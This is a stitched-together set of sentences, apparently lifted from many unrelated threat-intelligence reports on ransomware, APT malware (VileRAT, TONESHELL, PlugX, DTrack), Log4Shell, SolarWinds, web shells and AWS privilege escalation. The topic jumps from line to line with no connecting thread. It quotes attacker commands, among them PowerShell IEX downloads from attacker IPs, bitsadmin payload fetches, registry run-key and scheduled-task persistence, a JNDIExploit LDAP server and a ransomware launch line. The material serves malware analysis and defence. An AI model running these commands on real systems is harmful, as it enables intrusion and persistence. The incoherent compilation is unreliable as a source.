1	As the file properties are to be compared, encryption is not performed if the file properties related to the local drive are mainly applicable.FILE_ATTRIBUTE_RECALL_ON_OPENFILE_ATTRIBUTE_RECALL_ON_DATA_ACCESSFILE_ATTRIBUTE_OFFLINEFILE_ATTRIBUTE_NO_SCRUB_DATA5) A file search thread is created for each drive, and when a file to be encrypted is identified, a thread that performs encryption for each file is created and executed.6) Only up to 100,000 files are encrypted for each folder, and if it exceeds that number, no longer encrypted.7) If the file to be encrypted is larger than [MAX_FILE_SIZE]MB, encryption is not performed.
1	This data includes its signature (ctSb), original file size, and checksum value of original file data, and all other values are fixed and stored.10) Then, the encrypted file is saved by adding the .encoded01 extension to the existing extension.11) A ransom note file is created in every folder browsed.Ransom note filename: BackFiles_encoded01.txt16.
1	After that, a ransom note is created with the following path and contents, and a notepad.exe process is run to view it.Ransom note file path : C:\Users\[Username]\Desktop\BackFiles_encoded01.txt[+] Whats Happen?
1	It uses a Silo object, which is based on the job objects in Windows but with additional rules and capabilities, a kind of super-job.
1	Take control of the host from within the container, take control of the communication between the Docker Daemon to the container.
1	When I started to work with Windows containers, I noticed there is a lot going on behind the scenes, and I needed to map the attack vectors and decide where I want to take them.
1	The main goal is to break out from the container to the host.
1	Take control of the host from within the container, take control of the communication between the Docker Daemon to the container.
1	Analyze the kernel functions that check for Silo object (like James Forshaw did).
1	When running a new container through the docker client, the command will eventually end in the HCS.
1	The HCS will create a new Silo object with all the required components.
1	Inside the container (Silo object), we will have the default system windows processes (Figure 2).
1	One special process is CExecSvc, which is a service inside the container that implements the container execution service.
1	After this service is running, the HCS will communicate with it (Figure 5, No.1) and then set up a stdin\stdout pipe (Figure 5, No.
1	RPC is a technology to enable data communication between a client and a server across process and machine boundaries (network communication).
1	After the docker client communicates with the docker daemon (dockerd.exe), the docker daemon calls to one of the above-exposed functions.
1	Once the HCS RPC server received a call from the docker daemon, it communicates with CExecSvc through RPC functions that CExecSvc expose.
1	I attached vmcompute (HCS) and CExecSvc to IDA in order to debug the process.
1	After running docker exec -it <container_id> cmd We will get a shell, but behind the scenes, it first breaks on HCS on HcsRpc_CreateProcess and continues all the way down to the RPC function NdrClientCall3:
1	After calling imp_NdrClientCall3, the HCS is waiting for CExecSvc to respond.
1	It passes the information to the large function named CExec::Svc::Details::ExecuteProcess, impersonates the logged-on user to the container, and creates the required process, in our case cmd.exe:
1	In RPC, when the client calls a function, this function is being identified by Opnum which according to Microsoft MS-RPCE is:An operation number or numeric identifier that is used to identify a specific remote procedure call (RPC) method or a method in an interface.
1	We can see how dockerd calls HcsRpc_CreateProcess, which triggers vmcompute to call CExecCreateProcess that eventually creates the cmd.exe inside the container.
1	The first step was to get the RPC server of vmcompute and then build a client with Forshaw tools:
1	Below is a screenshot related to a WhatsApp chat that reveals how the threat actors have used social engineering techniques to deliver the malicious APK via WhatsApp as a delivery medium.
1	Upon installation of this malicious APK, it disguises itself as a PDF application and appears as a PDF icon on the device.
1	On clicking the App, it opens a google drive link using the web view module which leads to a letter related to the promotion of defense personnel in pdf format as shown below.
1	The code above indicates that the malicious APK used to acquire many dangerous permissions and the permissions mentioned indicate that the malicious APK has the following capabilities:
1	The source code is highly obfuscated to evade detection and thwart the analysis process as shown in the code snippet.
1	Upon launching, this malicious file, opens a Google Drive URL https[:]//drive[.]google[.]com/drive/folders/1a9kw9u_YGjBpgjoNd1FEWmEiwA-Gyyi0?usp=sharing which is hardcoded in the apps strings.xml file as shown above.
1	Also, the string.xml mentioned above contains one IP address 5[.]189[.]136[.]230 which belongs to C2 Server using port number 7860.
1	Back in the summer of 2020, DeathStalkers VileRAT initial infection consisted in spear-phishing emails sent to foreign exchange companies, from fake personas (a fake diamonds trading company for instance) who shared investment interests.
1	Should the target reply and continue with the conversation, the fake persona would at some point and upon request provide a link to a malicious file hosted on Google Drive (a Windows shortcut file masquerading as a PDF or in a ZIP archive), as identification documents.
1	The malicious link would then trigger the execution of arbitrary system commands, to drop a harmless decoy document, as well as a malicious and quite sophisticated binary loader that we dubbed VileLoader.
1	More recently, since at least late 2021, the infection technique has changed slightly, but the initial infection vector is still a malicious message: a Word document (DOCX, see Figure 1) is sent to targets via email (either as an attachment or embedded in the email body whenever possible).
1	The initial DOCX infection document itself is innocuous, but it contains a link to another malicious and macro-enabled DOTM document as a remote template (see Figure 3).
1	These DOTM files are automatically downloaded by Word when the DOCX is opened, and its embedded macro is triggered if the recipient enabled execution (as requested by the social engineering message, see Figure 1).
1	The malicious DOTM remote templates leverage the VBA stomping technique to conceal the code of an embedded macro.
1	VBA stomping involves making the editable VBA source code (i.e., the visible code of a macro) different from the code that will actually be executed.
1	As a result of VBA stomping, the real macro code that will be executed is hidden from standard tools (Microsoft Words macro edition tools, but also OLETools).
1	In the background, however, provided the VBA stomping worked, the DOTM-embedded macro silently gathers information about security products that are installed on the target computer (using WMI), sends them to a command-and-control (C2) server, decodes and drops files, then ultimately executes a malicious obfuscated JavaScript (JS) backdoor we called VileDropper.
1	The XOR decoding algorithm looks very close to the one that has been leveraged in VBS loader scripts from the PowerPepper toolchain (see Figure 7) in the past, and seemingly legitimate function names are also reminiscent of those that were used by PowerPepper macros (e.g., insert_table_of_figures, change_highlight_color, etc.).
1	XOR decoding function in a PowerPepper VBS loader (MD5 DB6D1F6AB887383782E4E3D6E4AACDD0)
1	The DOTM-embedded macro decodes and drops two files (in the %APPDATA% folder: Redist.txt and ThirdPartyNotice.txt, or pattern.txt and changelog.txt) out of encoded data that is stored in non-visible TextBox forms (see Figure 8).
1	In any case, the DOTM-embedded macro finally triggers VileDroppers execution, using a renamed copy of the WScript interpreter (msdcat.exe or msgmft.exe in the %APPDATA% folder), with a command such as:msgmft.exe /E:jScrIpt "\changelog.txt" 91 pattern.txt
1	VileDropper code excerpt in its original form
1	VileDropper needs at least two arguments to run for the first time (a third may be used as a flag to trigger environment-specific execution variations, depending on security products that are installed on targeted computers):
1	the first one is a partial password (used to decode XOR-encoded data),
1	the second is a path to an encoded payload file (contains VileLoader and its companion shellcode).
1	The file names and location will vary depending on samples, but they are placed under a seemingly legitimate common folder in %APPDATA% (e.g., exe and dev0Y11ZF.tmp in %APPDATA%\Microsoft\Printer Settings\Printers\);
1	schedules a task to run VileLoader 35 to 65 seconds later, then indefinitely every three hours and 45 minutes.
1	VileDropper sends data to a C2 server using an HTTP GET request to a fixed URL (e.g., hxxp://hubflash[.]co/admin/auth.php), using a preset User-Agent (both the C2 URL and the User-Agent change depending on VileDropper samples).
1	The useful information is stored as a JSON document, which is then XOR-encoded, base64-encoded, URL-encoded, and set as a cookie value in the HTTP request:
1	A hard-coded VileDropper identifier, which might designate a campaign or version (e.g., 9745B355).
1	A list of the names of the security products (AntiVirusProduct in WMI) that are installed on the target computer, separated by the pipe sign (|), then XORed, base64-encoded and URL-encoded.
1	The targets fully qualified login, as the shell expansion of %USERDOMAIN%\%USERNAME%, which is then XORed, base64-encoded and URL-encoded.
1	The targets operating system version, as returned from the WMI query SELECT Version FROM Win32_OperatingSystem, then base64-encoded and URL-encoded.
1	The task that is scheduled by VileDropper (whose name varies depending on samples, e.g., CDS Sync or UpdateModel Task), triggers the following type of execution command:
1	%APPDATA%\Microsoft\Printer Settings\Printers\FWDeviceEnabler.exe "[u]" "<encoded companion shellcode file name>" "[a]" "[w]" 0 "[d]" "[n]" <a letter of the encoded companion shellcode file name>
1	The characters between square brackets (such as [u]) in the command line designate the content of the corresponding JSON key (i.e., [u] is the encoded target identifier).
1	In VileDropper, strings that are encoded as part of the JavaScript obfuscation benefit from an additional XORing step: the XOR key that is embedded in data blobs is additionally XORed with a script-specific fixed password (a part of this fixed password is passed to VileDropper on its execution command line by the previous DOTM macro in the infection chain, the other part is hard-coded in VileDropper itself).
1	VileLoader is initially presented as a binary executable, which ensures the first stage of the execution.
1	This binary is always a legitimate one, which is meticulously doctored by the attackers to integrate a malicious unpacker-type payload.
1	As such, the binary may appear legitimate from a quick automated static code analysis perspective: it includes all the code of a legitimate application (but will not work as expected).
1	VileLoaders workflow starts by waiting 17 seconds.
1	Then it parses the command line arguments.
1	VileLoader then opens its encoded companion shellcode file (whose name is passed as a second argument to VileLoader, e.g., devENX1C6SS.tmp), reads and decodes it (using the Type B XOR algorithm), maps the deobfuscated data in a region with read, write and execute (RWX) permissions, and runs the next stage (stage 2) by starting a new thread.
1	VileLoaders first stage contains very unique signature techniques that have been stable since the first sample we analyzed in Q2 2020:
1	Sleep and GetTickCount Windows API functions are leveraged to generate random waiting delays.
1	The second stage content is extracted from VileLoaders encoded companion shellcode file, and run by VileLoaders first stage in-memory, in a new thread.
1	Some data are decoded as hash values that were generated with the djb2 algorithm.
1	Those hashes are in turn used to resolve the required function imports through a homebrew IAT: required libraries are loaded, their export tables are parsed, exported function names are hashed with djb2, and the hashes are compared to hashes that were decoded from internal data.
1	Finally, VileLoaders second stage builds an HTTP GET request that is used to download an implant package.
1	Like many components utilized by WIP19, all their credential harvesting tools  consisting mainly of password dumpers  were signed using the DEEPSoft certificate.
1	The main dumper used by the threat actor utilized open source projects to load an SSP to LSASS and then dump the process.
1	WIP19s password dumper consists of two components, one used as a loader, and the other as a dumper.
1	On many of the instances observed, the dumper was executed using WMIEXEC.
1	The dumper loader component is a signed EXE file, internally dubbed ssp_rpc_loader, as indicated from the PDB path embedded within the file.
1	As the name suggests, the loader uses RPC to load a malicious DLL file as an SSP (Security Support Provider), given as an argument.
1	The loader appears to be taken from an open source project available on GitHub.
1	The actual SSP loaded is NanoDump, which is loaded into LSASS and creates a minidump of the process.
1	Loading NanoDump as an SSP is a built-in function embedded within NanoDump.
1	This is done utilizing the MiniDumpWriteDump API.
1	The dump will be created in the following path:C:\\windows\emp\\1.binMuch like the loader, the threat actor did not bother to remove the PDB path for the DLL dumper.
1	WIP19 has been observed utilizing a less-common (although documented) DLL search order hijacking of explorer.exe to load a keylogging and screen recording component internally named ScreenCapDll_x64.
1	The threat actor dropped the malicious, signed DLL, in the path c:\windows\linkinfo.dll.
1	Dropping the file in this specific path triggers the loading of the DLL into explorer.exe the next time it is executed.
1	The threat actor may manually kill and restart the explorer.exe process to initiate the screen recording and keylogging functionality.
1	By default, it will keylog Internet Explorer activity, but it also supports keylogging of other popular browsers including Chrome and Opera.
1	Whilst we did not observe the initial infection vector in this intrusion, the SQLmaggie malware dropped on victim networks targets Windows systems and has to be executed in an MSSQL server.
1	We found that SQLMaggie masquerades as a legitimate DLL containing extended stored procedure functions for an MSSQL Server.
1	The executed methodology uses the sp_addextendedproc function to register an external DLL in a MSSQL server.
1	After registering the DLL into the MSSQL server, the threat actor is able to fully control the server machine and use this backdoor to conduct reconnaissance in the internal network.
1	Initial access root cause analysis is still ongoing in a number of response activities and CISA will update this section as additional initial vectors are identified.Volexity has also reported publicly that they observed the APT using a secret key that the APT previously stole in order to generate a cookie to bypass the Duo multi-factor authentication (MFA) protecting access to Outlook Web App (OWA).
1	The adversary added a malicious version of the binary solarwinds.orion.core.businesslayer.dll into the SolarWinds software lifecycle, which was then signed by the legitimate SolarWinds code signing certificate.
1	This binary, once installed, calls out to a victim-specific avsvmcloud[.]com domain using a protocol designed to mimic legitimate SolarWinds protocol traffic.
1	After the initial check-in, the adversary can use the Domain Name System (DNS) response to selectively send back new domains or IP addresses for interactive command and control (C2) traffic.
1	Consequently, entities that observe traffic from their SolarWinds Orion devices to avsvmcloud[.]com should not immediately conclude that the adversary leveraged the SolarWinds Orion backdoor.
1	The adversary is using virtual private servers (VPSs), often with IP addresses in the home country of the victim, for most communications to hide their activity among legitimate user traffic.
1	The attackers also frequently rotate their last mile IP addresses to different endpoints to obscure their activity and avoid detection.FireEye has reported that the adversary is using steganography (Obfuscated Files or Information: Steganography [T1027.003]) to obscure C2 communications.
1	Additionally, FireEye analysis identified that the backdoor implemented time threshold checks to ensure that there are unpredictable delays between C2 communication attempts, further frustrating traditional network-based analysis.While not a full anti-forensic technique, the adversary is heavily leveraging compromised or spoofed tokens for accounts for lateral movement.
1	Once this is accomplished, the adversary creates unauthorized but valid tokens and presents them to services that trust SAML tokens from the environment.
1	These tokens can then be used to access resources in hosted environments, such as email, for data exfiltration via authorized APIs.
1	During the persistence phase, the additional credentials being attached to service principals obfuscates the activity of user objects, because they appear to be accessed by the individual, and such individual access is normal and not logged in all M365 licensing levels.CISA has observed in its incident response work adversaries targeting email accounts belonging to key personnel, including IT and incident response personnel.These are some key functions and systems that commonly use SAML.CISA created Sparrow.ps1[5] to help detect possible compromised accounts and applications in the Azure/M365 environment.
1	Sparrow can be found on CISAs GitHub page at https://github.com/cisagov/Sparrow.The adversary is using a complex network of IP addresses to obscure their activity, which can result in a detection opportunity referred to as impossible travel.
1	Impossible travel occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the time period between the logins).
1	In this incident, we observe the actors using -t and - x arguments, along with a specific drive path to encrypt:C:\Windows\Tempemp\bin\Maui.exe -t 8 -x E:1C:\Windows\Tempemp\bin\Maui.exe -t 8 -x E:
1	In this case, -t 8 sets the ransomware thread count to eight, -x commands the malware to self melt, and the E: value sets the path (the entire drive in this case) to be encrypted.
1	The 3Proxy tool, likely utilized by the threat actor, was compiled on 2020-09-09 and deployed to the victim on 2020-12-25.
1	After an unknown exploit was used on a vulnerable HFS server and whoami was executed, the Powershell command below was executed to fetch an additional Powershell script from the remote server:C:\windows\system32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('hxxp://145.232.235[.]222/usr/users/mini.ps1')
1	The mini.ps1 script is responsible for downloading and executing the above DTrack malware via bitsadmin.exe:bitsadmin.exe /transfer myJob /download /priority high"hxxp://145.232.235[.]222/usr/users/dwem.cert"
1	According to our telemetry, the actor compromised this server via the CVE-2017-10271 exploit.
1	We saw Andariel abuse identical exploits and compromise WebLogic servers in mid-2019, and previously reported this activity to our Threat Intelligence customers.
1	In this case, the exploited server executes the Powershell command to fetch the additional script.
1	The fetched script is capable of downloading a Powershell script from the server we mentioned above (hxxp://145.232.235[.]222/usr/users/mini.ps1).
1	A string encoded LDAP commands and URIs.Base64 encoded LDAP commands and URIs.Employed upper and lower toggling cases in LDAP command.
1	We have noticed malware, and ransomware families utilize the Log4j exploit to spread their campaign.
1	When he entered the payload, he received a DNS request on dnslog.cn from IPs 17.123.16.14  and 17.140.110.15.
1	A critical severity rated vulnerability(CVSS score 10/10)thataffects Java-based applicationsrunning theLog4jreporting frameworkhas beenrecentlyreported.Also named as Log4Shell or Log Jam, this vulnerability allows an attacker towrite one specific string to the log and gain full access to the exploited server via remote code execution.
1	Alookup() call is intended to return a Java object in each of these circumstances.
1	A remote URL codebase may theoretically load this object and factory bytecode (readsa webserver with .class files).
1	JNDI featuresareused in the configuration, log messages, and parameters.ApacheLog4j2<=2.14.1 doesnot protect against attacker-controlled LDAP and other JNDI-related endpoints.
1	When message lookupsubstitutionis allowed, an attacker with accesstolog messages or log message parameters can run arbitrary code imported from LDAP servers.
1	The below figuredemonstrates thecreation ofamaliciousLDAP serverusingJNDIExploitusingthecommandjava -jar JNDIExploit-1.2-SNAPSHOT.jar -i192.168.148.143 -p 8888.
1	The mitigation is to remove theJndiLookupclass from theclasspathfor versions 2.0-beta9 to 2.10.0: zip -q -dLog4j-core-*.jar org/apache/logging/Log4j/core/lookup/JndiLookup.class
1	After installation, the extension opens a new tab where it urges the user to keep the changes made by it.
1	If a user clicks on Change it back or manually tries to revert to the default settings, the extension will not work or will be disabled automatically.
1	This extension tries to change the browser search URL to go.searchsecurer[.]com and further redirects the users search query to the Yahoo search engine.
1	The users search keyword can be easily captured using this redirection technique.
1	After capturing the search keywords, the extension verifies whether the keyword is a domain name and compares it with the hardcoded domain list hosted on the searchsecurer[.]com in JSON format.
1	The figure below shows the code that should take the user to a Russian site when the URL added by the user is flagged as malicious.
1	This extension displays a warning message when it flags a site as malicious and redirects to the Russian government site when users click on the link shown in the warning message.
1	After installation, this extension changes the default search URL of the victims browser to smartwebfinder[.]com.
1	The figure below shows the manifest.json file of this extension.
1	The user search goes through multiple redirects, and the final results will appear via the Bing search engine.
1	Gives extension access to chrome.webRequest API to observe and analyze traffic and to intercept, block, or modify requests in flight.
1	storage: Gives extension access to the chrome.storage API.
1	proxy: Grants the extension access to the chrome.proxy API
1	This extension can open ultrasurfing[.]com in a new tab multiple times with every search action performed on the browser and can slow down the system by consuming resources unnecessarily.
1	This extension redirects traffic to Yandex metrics, a web-based analytics service offered by Yandex that tracks and reports website traffic.
1	In our observation of the campaigns, we noted that, Earth Preta abused fake Google accounts to distribute the malware via spear-phishing emails, initially stored in an archive file (such as rar/zip/jar) and distributed through Google Drive links.
1	Users are then lured into downloading and triggering the malware to execute, TONEINS, TONESHELL, and PUBLOAD.
1	Based on our monitoring of this threat, the decoy documents are written in Burmese, and the contents are "" (Internal-only).
1	Most of the topics in the documents are controversial issues between countries and contain words like "Secret" or Confidential.
1	The attackers use the stolen documents as decoys to trick the targeted organizations working with Myanmar government offices into downloading and executing the malicious files.
1	We observed that all the emails we analyzed had the Google Drive links embedded in them, which points to how users might be tricked into downloading the malicious archives.
1	The file types of the archives include compressed files such as .rar, .zip, and .jar, to name a few.
1	Rather than add the victims addresses to the emails To header, the threat actors used fake emails.
1	Meanwhile, the real victims' addresses were written in the "CC" header, likely to evade security analysis and slow down investigations.
1	The first decoy's file name is Assistance and Recovery(china).exe, while another decoy .PDF document (.pdf, meaning Embassy of the Republic of Myanmar") was observed in a compressed file named Assistance and Recovery(china).rar.
1	Notably, the documents in the compressed file attachment(EN).rar are mostly image files.
1	The malicious DLL and the executable, which are used for the next layer of sideloading, are also included among them.
1	The executable Increasingly confident US is baiting China.exe is a legitimate executable (originally named adobe_licensing_wf_helper.exe, which is the Adobe Licensing WF Helper).
1	When executed for the first time, the executable tries to install the malware by copying the .exe file and moving libcef.dll (detected by Trend Micro as Trojan.Win32.PUBLOAD) to <%PUBLIC%> Both .exe and .dll files will be renamed C:\Users\Public\Pictures\adobe_wf.exe and C:\Users\Public\Pictures\libcef.dll, respectively.
1	The threat actor utilizes the .lnk file to install the malicious files by decompressing the archive file with WinRAR.
1	When it is executed, it sideloads CefBrowser.dll and executes the main routine in its export function, CCefInterface::SubProcessMain.
1	It also abuses schtasks for persistence.
1	Files in the archive of Type Clibcef.dll (detected by Trend Micro as Trojan.Win32.TONEINS) is an installer for the next-stage malware.
1	PUBLOAD is a stager that can download the next-stage payload from its command-and-control (C&C) server.
1	Once the .dll is executed, it first checks if the same process is already running by calling OpenEventA.
1	PUBLOAD creates a directory in <C:\Users\Public\Libraries\> and drops all the malware, including the malicious DLL and the legitimate executable, into the directory.
1	Adding a registry run key cmd.exe /C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Graphics /t REG_SZ /d \"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \"C:\\Users\\Public\\Libraries\\Graphics\\AdobeLicensing.exe\"\" /f
1	Creating a schedule task schtasks.exe /F /Create /TN Microsoft_Licensing /sc minute /MO 1 /TR C:\\Users\\Public\\Libraries\\Graphics\\AdobeLicensing.exe Anti-Antivirus: API with callback PUBLOAD malware decrypts the shellcode in AES algorithm in memory.
1	PUBLOAD malware decrypts the shellcode in AES algorithm in memory.
1	The shellcode is invoked by creating a thread or using different APIs.
1	The APIs can accept an argument of a callback function, working as an alternative to trigger the shellcode.
1	The decrypted PUBLOAD shellcode collects the computer name and the username as the payload of the first beacon.
1	The payload will then be encrypted with the predefined RC4 (Rivest Cipher 4) key.
1	After the encryption, the stager uses a specific byte sequence as its packets header.
1	It prepends the magicbytes "17 03 03" and the payload size before the encrypted data.
1	The stager also checks if the response packet has the same magic header, 17 03 03.
1	If so, the downloaded payload in memory will be treated as a piece of shellcode and will be executed directly.
1	Trojan.Win32.TONEINS is the installer for TONESHELL backdoors.
1	The installer drops the TONESHELL malware to the %PUBLIC% folder and establishes the persistence for it.
1	TONEINS malware usually comes in the lure archives, and in most cases, the name of the TONEINS DLL is libcef.dll.
1	The malicious routine is triggered via calling its export function cef_api_hash.
1	After persistence is established, TONESHELL then copies the legitimate executable and the malicious DLL to the %PUBLIC% folder, wherein both files have names that start with ~ in the lure archive.
1	The TONESHELL malware is the main backdoor used in this campaign.
1	It is a shellcode loader that loads and decodes the backdoor shellcode with a 32-byte key in memory.
1	In order to make sure that the TONESHELL is installed correctly, Backdoor.Win32.TONESHELL first checks if the process path matches the expected one.
1	If so, the malicious code could be triggered by the custom exception handler.
1	Different exception handlers will be invoked based on the result of the process name check, continuing the malicious routine by triggering the exception with the call _CxxThrowException.
1	After it is invoked, the C++ runtime will find the corresponding exception handler from the ThrowInfo structure all the way down to the CatchProc member in the _msRttiDscr structure, which contains the real malicious codes.
1	After the malicious exception handler is triggered, it starts to decode the next-stage TONESHELL shellcode.
1	To decode the shellcode, it first decodes a 32-byte key in XOR operations with 0x7D, and the key will then be used to decode the shellcode body.
1	TONESHELL supports up to 10 C&C servers by design, but in all the samples we encountered only one C&C server was used.
1	Before connecting to the C&C server, it generates a victim ID (the variable unique_id) with the victim's volume serial and the computer name, or with a randomly generated GUID.
1	The Google Drive direct download link is represented in the format https[:]//drive.google.com/uc?id=gdrive_file_id&export=download.
1	The victim's ID (specified by the "Guid" header in the first beacon and later used in the "Cookie" header) is also generated from a random GUID.
1	Different algorithm for the victim ID generation in TONESHELL variant BThe backdoor's protocol is also different.
1	The payload in the packet is encoded with a random 32-byte key, and the key differs from packet to packet.
1	The new key is generated whenever a new request is made.
1	Using CyberChef disassembler we can get the assembly of the shellcode.
1	Here they made it easy for us to find all of the values needed to input into a decoder.
1	The shellcode will use URLDownloadToFileW to download from hxxp://103.207.37[.]236/winspace/scrss.exe and save it to %PUBLIC%\vbc.exe and then load it with "ShellExecuteExW".
1	China Chopper is an Active Server Page Extended (ASPX) web shell that is typically planted on an Internet Information Services (IIS) server through an exploit.
1	This script is essentially a page where when an HTTP POST request is made to the page, and the script will call the JScript eval function to execute the string inside a given POST request variable.
1	In the above script, the POST request variable is named secret, meaning any JScript contained in the secret variable will be executed on the server.
1	After setting up a test IIS server and placing the web shell on the server, we can now test our own payloads against it.
1	This script was expected to be sent as an HTTP POST request from the client to the server, with the custom JScript to be sent in the secret POST field.
1	We can see that the client encodes the custom JScript in Base64 and uses the markers ->| and <-| to help the client identify the portion of the response relating to the web shell.
1	According to this code, the Virtual Terminal feature will start the CMD process silently and execute the command sent from the client.
1	The output is then captured and sent back to the client.
1	When an ASPX script is seen by the ASP.NET runtime for the first time, the ASPX script is parsed and transformed into a C# or VB.NET class file.
1	This class file is then either compiled into its own .NET assembly or, depending on the IIS settings, combined with other converted ASPX scripts to form one larger .NET assembly.
1	By providing a specially crafted Spring Expression Language (SPeL) as a routing expression, an attacker can access local resources and execute commands in the host.
1	Therefore, this CVE allows an HTTP request header, containing a spring.cloud.function.routing-expression object with a SPeL expression, to be evaluated through the StandardEvaluationContext, leading to an arbitrary RCE.
1	An image that induces macro execution has not been found upon opening the document file, but the following code exists in the macro included in the file.
1	This creates a message box telling the user that the macro must be enabled when the user begins typing.
1	Thus, the user clicks the Enable Content button to fill in the answers in the document, executing the VBA macro embedded in the file.
1	The VBA macro includes the Document_Open()function, enabling the malicious macro to be executed automatically.
1	The executed macro code is obfuscated with a similar method as the previous versions, and it ultimately creates and executes a VBScript tmp.pip file in the %appdata% folder.
1	When the tmp.pip file is executed, it creates Defender.log, DefenderUpdate.lba, and Ahnlab.lnk.
1	Afterward, it changes the file extension of DefenderUpdate.lba to bat and executes this file.
1	Once that was the case, the attackers servers stopped responding to requests from bots working on virtual machines.
1	First of all, the perpetrators looked at what was happening on the victims desktop.
1	After that they enabled the remote command line and used it to browse the root folder of the current disk, searched for the file winmm.dll, and checked the operating system version.
1	It works with the file system and the attackers used it to browse the folders C:Windows and C:Work.
1	Then they tried to restart the computer, but made a mistake in the parameters of the shutdown command, having typed shutdown /t /r 1 (the computer should have been restarted in 1 second), but after a while they shut the computer down completely with the use of the correct command shutdown /s /t 1.
1	When the virtual machine restarted, the malicious users connected to it and downloaded an auxiliary program named ff._exe_ into the folder Config.Msi.
1	They downloaded three files wm.bat, ctime.exe and wm3280.dll and executed wm.bat.
1	copies the latest version of malicious library wm3280.dll to the folder c:windows under the name winmm.dll;
1	specifies the time attributes of file that has just been copied (creation time, modification time and last access) so they are the same as those for system library c:windowstwain.dll;
1	specifies attributes of the malicious library as hidden, system, read only;
1	After that another auxiliary program ec.exe was downloaded and executed.
1	This program looks for certificates installed in the system containing a private key.
1	If any are found, it drops them as files onto the disk.
1	When the program finished working the intruders used the command dir to check if any certificates had appeared.
1	Since the infected virtual operating system had no certificates of this kind installed the attackers saw nothing and removed the ec.exe program.
1	They then manually went through the folders on disk C:, came across a folder called Sign that I had created in advance where I had put a certificate with which a certain program was signed.
1	The cybercriminals took a close interest in the folder and a file with the extension .cer and made a copy of the file for themselves.
1	When the certificate theft had been completed, the attackers used the net view command to see which computers existed in network neighborhood and displayed a listing of all established connections with the netstat an command.
1	After analyzing the data they retrieved, the criminals figured out that this was a fake system, and the C&C server stopped accepting connections from the bot working on that virtual machine.
1	They had a look at some folders (created in advance to simulate work-related activity by our fictitious new employee): D:WorkFasmatgui, C:UsersMarta FrDesktop, F:!Far, D:Exchange-MartaFor Magnus, D:WorkFasmatmenu, D:WorkFasmattex
1	They tried to access disk C: of the remote computer with the use of the command dir and were denied access:
1	They then tried to access the file system of one of them  unsuccessfully:
1	With the help of net user they took a look at what users were registered on the infected computer:
1	The intruders were looking for their malicious library:
1	They examined the content of the current users documents folder:
1	For some reason they turned off the following attributes in their malicious library: hidden, system, read onl (when the intruders operated on the virtual machine they did the opposite and set those attributes in the malicious library using the wm.bat file):
1	They loaded the program Network Password Recovery by the developer Nir Sofer to the infected machine.
1	When the program finished working the file a.txt appeared and the intruders looked at it:
1	They tried using Martas credentials to access the disk C: on Karls computer it didnt work:
1	They then tried to play around with the input data of the command net use it didnt help:
1	After that the intruders probably lost interest, removed all the files they had created and did nothing more of any significance.
1	The loader starts out by running a legitimate executable, which is abused to load a malicious DLL instead of a legitimate one on which it depends.
1	In both variants, the abused executable isjjs.exe, which loads jli.dll.
1	The malicious DLL maps the data file, svchost.bin, to memory and decrypts it.
1	The decrypted content is a shellcode that is injected into svchost.exe and contains the actual malicious payload.
1	The injection flow is rather simple and is done by creating a process in suspended state, allocating memory withVirtualAllocEx, writing the shellcode withWriteProcessMemory, and running it usingCreateRemoteThread.
1	It installs itself (jjs.exe) as the service and starts.
1	The injected shellcode reflective loads in-memory an executable it reconstructs from data that it is bundled with it.
1	The executable tries to run conhost.exe from C:\Users\Public\Documents, and in case it doesnt exist, it turns toffca[.]caibi379[.]comto download it.
1	Following the injection to svchost.exe by the loader, the shellcode decrypts another part of itself and use RtlDecompressBuffer API to further unpack the PlugX DLL.
1	This extremely simplified downloader only has the ability to download and execute a base-64 encoded executable from the hardcoded address using a simple System.Net.WebClient HTTP request:ffca[.]caibi379[.]com/rwjh/qtinfo.txt.
1	Besides killing the process, it also makes sure to delete any related keys in the registry, and recursively deletes any related files and directories on the machine.
1	HawkEye runs a normal process named vbc.exe without directly running WebBrowserPassView and Mail PassView, injects the tools into it, and runs them.
1	The process tree below shows that when vbc.exe is executed and the account information extraction tool runs in the executable file, it saves credentials of a web browser as holderwb.txt file, and account information of an e-mail client as holdermail.txt file.
1	It then reads the created text files and sends them to the C&C server.
1	If the visitor is validated as a target, the first JavaScript stage will load a second one, which in turn will trigger the drive-by download attack, showing a fake update pop-up (see Fig.2).Fig.2.
1	The visitor is then expected to fall into the update trap, and download a malicious installer package that will set up a backdoor.
1	The payload leverages the RTCPeerConnection API and ipify service to fingerprint visitors.
1	The gathered data is sent to loginwebmailnic.dynssl[.]com through HTTP GET requests, in order to validate the visitor as a target: https://loginwebmailnic.dynssl[.]com/all/content.php?jsoncallback=&lanip=&wanip=&urlpath=&_=The JSON-formatted response, whose only key is result, can either be t or f (true or false).
1	This other branch loaded scripts from root20system20macosxdriver.serveusers[.]com, and leveraged https://loginwebmailnic.dynssl[.]com/part/mac/contentmc.php URL to validate targets.
1	The second JavaScript stage is named (script|jquery)-file.js, and is obfuscated with Sojson version 5 (see Fig.5).Fig.5.
1	The pop-up links to a PE executable hosted on github[.]com/AdobeFlash32/FlashUpdate.
1	a C installer bundling the legitimate Flash installer and a vanilla Stitch backdoor, as well as a C++ infostealer that collects information about host computers (OS version, IP address, hostname) and sends them over HTTP/S.This malicious update package is a NSIS installer version 3 that will drop and execute two other binaries:The installer is detected by Kaspersky endpoint protection heuristics as HEUR:Trojan.Win32.Tasker.gen.The Go programmed Intelsyc implant is aimed at staging itself, downloading the Godlike12 backdoor (described below), and setting up persistence.
1	It will first retrieve /flash/sys.txt with HTTP GET on adobeflash31_install.ddns[.]info.
1	This implant is written in Go language, and its C2 channel relies on file exchanges with a Google Drive space, through Google Drives HTTPS API v3.
1	Godlike12 first proceeds with host fingerprinting upon startup (hostname, IP address, MAC address, Windows version, current time).
1	The result is encrypted, base64-encoded, stored in a text file at %TEMP%/[ID]-lk.txt, and uploaded to the remote Google Drive.
1	The implant then regularly checks for a remote [ID]-cs.txt, that contains encrypted commands to execute, and stores encrypted command results in %TEMP%/[ID]-rf.txt to later upload them to the same Google Drive space.
1	Attackers use of permission chaining to escalate privilege.
1	An attacker steals a credential from an employee through phishing (e.g.developer role session token).
1	The attacker finds out the permissions of the token by using the AWS IAM API or enumerating the services.
1	The attacker discovers that the token has IAM:PassRole permission and there is no restriction on the roles that can be passed.
1	The attacker can pass ANY role.
1	The attacker checks the existing roles and their trust policies.
1	The attacker needs to find roles assumable by services to access.
1	The attacker can move forward after finding a subset of roles that meet the conditions.
